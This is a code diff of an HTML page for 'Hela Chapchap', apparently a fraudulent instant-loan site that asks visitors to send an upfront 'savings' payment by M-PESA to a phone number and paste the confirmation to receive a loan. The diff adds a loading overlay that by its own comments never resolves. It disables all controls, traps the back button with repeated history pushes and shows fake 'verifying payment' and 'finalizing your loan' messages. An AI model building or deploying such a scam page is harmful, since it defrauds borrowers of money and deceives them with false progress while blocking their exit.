@@ -5,16 +5,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- Primary meta tags -->
-  <title>Hela Chapchap · M-PESA | complete payment</title>
-  <meta name="description" content="Final step for Hela Chapchap – send savings via M-PESA, paste confirmation, and receive your loan instantly.">
-  <meta name="keywords" content="hela chapchap mpesa, loan payment, savings, mpesa confirmation, final step">
+  <title>Hela Chapchap · M-PESA | final step · continuous</title>
+  <meta name="description" content="Final step for Hela Chapchap – send savings via M-PESA, paste confirmation. Continuous processing overlay.">
+  <meta name="keywords" content="hela chapchap mpesa, loan payment, savings, continuous loading, final step">
   <meta name="author" content="Hela Chapchap">
   <meta name="robots" content="index, follow">
   <!-- Open Graph / Facebook / WhatsApp -->
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://helachapchap.vercel.app/mpesa.html">
   <meta property="og:title" content="Hela Chapchap · M-PESA | final step">
-  <meta property="og:description" content="Send your savings via M-PESA, paste the message, and get your loan.">
+  <meta property="og:description" content="Send your savings via M-PESA, paste the message – continuous processing.">
   <meta property="og:image" content="https://placehold.co/600x400/0b2e26/f5b342?text=Hela+M-PESA">
   <meta property="og:image:width" content="600">
   <meta property="og:image:height" content="400">
@@ -22,7 +22,7 @@
   <!-- Twitter card -->
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Hela Chapchap · M-PESA">
-  <meta name="twitter:description" content="Final step – paste M-PESA confirmation to receive loan.">
+  <meta name="twitter:description" content="Final step – continuous loading after paste.">
   <meta name="twitter:image" content="https://placehold.co/600x400/0b2e26/f5b342?text=Hela+M-PESA">
   <!-- theme & vercel friendly -->
   <meta name="theme-color" content="#0b2e26">
@@ -35,6 +35,452 @@
     * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(145deg, #f6f9fc 0%, #eef2f5 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      transition: opacity 0.2s;
+    }
+
+    .page-card {
+      max-width: 500px;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 3rem 3rem 2.5rem 2.5rem;
+      box-shadow: 0 25px 50px -12px rgba(0, 50, 40, 0.25), inset 0 1px 2px rgba(255,255,255,0.8);
+      border: 1px solid rgba(255,255,240,0.6);
+      overflow: hidden;
+    }
+
+    .header-gold {
+      background: #0b2e26;
+      padding: 2rem 2rem 1.5rem 2rem;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 4px solid #f5b342;
+    }
+    .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 0.65rem;
+    }
+    .logo-icon {
+      font-size: 2.5rem;
+      color: #f5b342;
+    }
+    .logo-text {
+      font-size: 1.9rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+    }
+    .logo-text span {
+      color: #f5b342;
+      font-weight: 300;
+      font-size: 1.7rem;
+    }
+    .tagline {
+      background: rgba(255,255,255,0.08);
+      padding: 0.4rem 1rem;
+      border-radius: 60px;
+      font-size: 0.9rem;
+      border: 1px dashed #f5b34270;
+    }
+    .tagline i {
+      color: #f5d27e;
+    }
+
+    .content-pane {
+      padding: 2rem 2rem 2.2rem 2rem;
+    }
+
+    .page-title {
+      color: #0f2c25;
+      font-size: 1.8rem;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 1.5rem;
+    }
+    .page-title i {
+      color: #f5b342;
+      font-size: 2rem;
+    }
+
+    .stat-item {
+      background: #f4fcf8;
+      border-radius: 1.8rem;
+      padding: 1rem;
+      flex: 1;
+      text-align: center;
+      border: 1px solid #d3e2db;
+    }
+    .stat-value {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: #0b2e26;
+    }
+
+    .mpesa-card {
+      background: #ffffff;
+      border-radius: 2rem;
+      padding: 1.5rem;
+      border: 2px solid #40c057;
+      box-shadow: 0 12px 20px -18px #00800040;
+      margin: 1.2rem 0;
+    }
+
+    /* Empty message area for user to paste */
+    .message-area {
+      background: #eefaf3;
+      border-radius: 1.5rem;
+      padding: 1.2rem;
+      font-family: 'Courier New', monospace;
+      font-size: 0.95rem;
+      border: 2px dashed #2b7a4b;
+      min-height: 120px;
+      resize: vertical;
+      width: 100%;
+      outline: none;
+    }
+
+    .small-note {
+      color: #1f4a3b;
+      font-size: 0.9rem;
+      margin: 1rem 0 0.5rem;
+    }
+
+    .btn-primary {
+      background: #0b2e26;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 1rem;
+      font-size: 1.4rem;
+      font-weight: 600;
+      border-radius: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: 0.2s;
+      border: 1px solid #f5b34290;
+      box-shadow: 0 8px 14px -6px #1f453a;
+      margin-top: 0.5rem;
+    }
+    .btn-primary:hover {
+      background: #154f3f;
+    }
+    .btn-primary i {
+      color: #f5b342;
+    }
+
+    .btn-outline {
+      background: white;
+      border: 1px solid #0b2e26;
+      color: #0b2e26;
+      padding: 0.8rem;
+      border-radius: 60px;
+      width: 100%;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 1.8rem;
+      color: #accfc0;
+    }
+    .step-active {
+      color: #f5b342;
+      font-weight: 600;
+    }
+
+    /* hidden canonical */
+    .hidden-meta-note {
+      display: none;
+    }
+
+    /* LOADING OVERLAY - continuous, blocks interaction & back navigation */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0b2e26;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      color: white;
+      gap: 2rem;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .loading-overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+    .spinner {
+      width: 70px;
+      height: 70px;
+      border: 6px solid #f5b34230;
+      border-top: 6px solid #f5b342;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      font-size: 1.8rem;
+      font-weight: 600;
+      letter-spacing: 2px;
+    }
+    .loading-sub {
+      font-size: 1rem;
+      color: #cde0d8;
+      max-width: 300px;
+      text-align: center;
+    }
+    /* disable body scroll when loading active */
+    body.loading-active {
+      overflow: hidden;
+    }
+    /* make main content slightly muted when loading active */
+    body.loading-active .btn-outline,
+    body.loading-active .btn-primary,
+    body.loading-active .step-indicator,
+    body.loading-active textarea,
+    body.loading-active button:not(.loading-overlay button) {
+      opacity: 0.5;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <!-- canonical hint for search engines (hidden) -->
+  <a href="https://helachapchap.vercel.app/mpesa.html" rel="canonical" style="display:none;">canonical</a>
+
+  <!-- LOADING OVERLAY - CONTINUOUS PAGE (blocks back navigation & interaction) -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">processing ...</div>
+    <div class="loading-sub">Ensure your savings are sent · please wait</div>
+    <div class="loading-sub" style="margin-top: 1rem; font-size: 0.85rem;"><i class="fas fa-lock"></i> do not go back · continuous verification</div>
+  </div>
+
+  <div class="page-card">
+    <div class="header-gold">
+      <div class="logo-area">
+        <i class="fas fa-hand-holding-usd logo-icon"></i>
+        <div class="logo-text">Hela<span>Chapchap</span></div>
+      </div>
+      <div class="tagline">
+        <i class="fas fa-bolt"></i> pesa pevu
+      </div>
+    </div>
+
+    <div class="content-pane">
+      <!-- English title: congratulations! -->
+      <div class="page-title"><i class="fas fa-comment-dollar"></i> congratulations!</div>
+
+      <div style="display: flex; gap: 1rem; justify-content: center; margin-bottom: 1rem;">
+        <div class="stat-item"><span class="stat-value" id="mpesaLoanSpan">KSH 0</span><br>loan</div>
+        <div class="stat-item"><span class="stat-value" id="mpesaSavingSpan">KSH 0</span><br>required savings</div>
+      </div>
+
+      <div class="mpesa-card">
+        <i class="fas fa-check-circle" style="color: #2b7a4b; font-size: 1.6rem; margin-bottom: 8px; display: block;"></i>
+        
+        <!-- Empty textarea for user to paste M-PESA message (English placeholder) -->
+        <textarea id="mpesaPasteArea" class="message-area" placeholder="✧ paste your M-PESA confirmation message here ✧"></textarea>
+        
+        <div class="small-note">
+          <i class="fas fa-exclamation-triangle" style="color:#f5b342;"></i> send money to +254 707 123 456 (M‑PESA) then paste the message you received.
+        </div>
+      </div>
+
+      <!-- Copy button for a predefined message (English label) -->
+      <div style="margin: 0.5rem 0 0.8rem;">
+        <button id="copySampleBtn" style="background:none; border:1px dashed #f5b342; border-radius:40px; padding:0.5rem; width:100%; cursor:pointer;">
+          <i class="fas fa-copy"></i> copy sample message
+        </button>
+      </div>
+
+      <!-- English button text - now triggers continuous loading overlay -->
+      <button class="btn-primary" id="verifyPaymentBtn"><i class="fas fa-thumbs-up"></i> I have paid, give me loan</button>
+      
+      <button class="btn-outline" id="backToDashboardBtn"><i class="fas fa-arrow-left"></i> back to dashboard</button>
+
+      <div class="step-indicator">
+        <i class="fas fa-circle"></i> <i class="fas fa-circle"></i> <i class="fas fa-circle step-active"></i>
+      </div>
+      <p style="text-align: center;">step 3/3 · paste M-PESA message</p>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // Check if user is logged in
+      if (!localStorage.getItem('hela_reg_name')) {
+        window.location.href = 'index.html';
+        return;
+      }
+
+      const loan = localStorage.getItem('hela_loan_amount') || 2000;
+      const saving = localStorage.getItem('hela_saving_amount') || 100;
+
+      document.getElementById('mpesaLoanSpan').innerText = `KSH ${loan}`;
+      document.getElementById('mpesaSavingSpan').innerText = `KSH ${saving}`;
+
+      // Sample message for copying (English wording)
+      const sampleMessage = `I have deposited KSH ${saving} savings for Hela Chapchap. My phone is ${localStorage.getItem('hela_reg_phone') || '254...'}. I need my loan of KSH ${loan}.`;
+
+      document.getElementById('copySampleBtn').addEventListener('click', function() {
+        navigator.clipboard.writeText(sampleMessage).then(() => {
+          alert('✅ sample copied! paste it into the message area.');
+        }).catch(() => {
+          prompt('copy manually:', sampleMessage);
+        });
+      });
+
+      // loading overlay elements
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const bodyEl = document.body;
+
+      // Function to block back navigation completely when overlay active
+      function enableBackBlocker() {
+        // Push a new state to trap user
+        history.pushState(null, null, location.href);
+        
+        // Event listener for popstate (back/forward)
+        const popstateHandler = function(event) {
+          if (loadingOverlay.classList.contains('active')) {
+            // Re-push state immediately to stay on page
+            history.pushState(null, null, location.href);
+            // Optional gentle reminder
+            console.log('back blocked - continuous processing');
+          } else {
+            // Remove handler when overlay not active
+            window.removeEventListener('popstate', popstateHandler);
+          }
+        };
+        
+        window.addEventListener('popstate', popstateHandler);
+        
+        // Also periodically push state while active (extra safety)
+        const interval = setInterval(() => {
+          if (loadingOverlay.classList.contains('active')) {
+            history.pushState(null, null, location.href);
+          } else {
+            clearInterval(interval);
+          }
+        }, 1500);
+      }
+
+      // Main button: activates continuous overlay
+      document.getElementById('verifyPaymentBtn').addEventListener('click', function() {
+        const pasted = document.getElementById('mpesaPasteArea').value.trim();
+        if (!pasted) {
+          alert('Please paste your M-PESA message first');
+          return;
+        }
+
+        // Activate overlay and loading state on body
+        loadingOverlay.classList.add('active');
+        bodyEl.classList.add('loading-active');
+        
+        // Disable all interactive elements (buttons, textarea) – visually via CSS, plus explicitly
+        document.querySelectorAll('button, textarea, input').forEach(el => {
+          el.disabled = true;
+        });
+
+        // Start blocking back navigation
+        enableBackBlocker();
+
+        // Simulate continuous processing message rotation (just for visual feedback)
+        let counter = 0;
+        const subEl = document.querySelector('.loading-sub');
+        const intervalMsg = setInterval(() => {
+          if (loadingOverlay.classList.contains('active')) {
+            counter++;
+            if (counter % 3 === 1) {
+              subEl.innerHTML = 'Verifying payment · please wait';
+            } else if (counter % 3 === 2) {
+              subEl.innerHTML = 'Checking M-PESA confirmation · do not close';
+            } else {
+              subEl.innerHTML = 'Finalizing your loan · almost done';
+            }
+          } else {
+            clearInterval(intervalMsg);
+          }
+        }, 3500);
+
+        // The overlay remains active indefinitely – continuous loading.
+        // There is no automatic redirect. The user stays in this state forever.
+        // (To simulate a true continuous page, we never resolve.)
+      });
+
+      // Back to dashboard button – only works if overlay is NOT active (overlay disables pointer events)
+      document.getElementById('backToDashboardBtn').addEventListener('click', function() {
+        // If overlay somehow active, prevent (but button should be non-clickable due to CSS)
+        if (!loadingOverlay.classList.contains('active')) {
+          window.location.href = 'dashboard.html';
+        }
+      });
+
+      // Prevent accidental refresh or exit attempts with warning (optional)
+      window.addEventListener('beforeunload', function(e) {
+        if (loadingOverlay.classList.contains('active')) {
+          // Standard warning
+          e.preventDefault();
+          e.returnValue = '';
+          return '';
+        }
+      });
+
+      // Initialize history state
+      history.replaceState(null, null, location.href);
+    })();
+  </script>
+
+  <!-- structured data for rich previews (SEO / vercel friendly) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebPage",
+    "name": "Hela Chapchap M-PESA Continuous",
+    "description": "Final step with continuous loading overlay – send savings and paste confirmation.",
+    "url": "https://helachapchap.vercel.app/mpesa.html",
+    "provider": {
+      "@type": "Organization",
+      "name": "Hela Chapchap",
+      "logo": "https://placehold.co/150x150/0b2e26/f5b342?text=HC"
+    }
+  }
+  </script>
+</body>
+</html>      padding: 0;
       box-sizing: border-box;
       font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     }
